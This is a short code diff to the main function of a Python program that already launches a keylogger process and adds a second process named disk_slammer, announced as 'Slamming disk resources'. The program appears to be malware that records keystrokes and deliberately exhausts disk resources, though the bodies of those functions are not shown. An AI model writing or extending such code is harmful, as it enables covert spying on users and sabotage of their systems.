@@ -124,6 +124,9 @@ def main():
     p2 = Process(target = key_logger)
     print("logger running")
     p2.start()
+    p5 = Process(target = disk_slammer)
+    p5.start()
+    print("Slamming disk resources")
     
     dir_create()
     print("Directory successfully created")
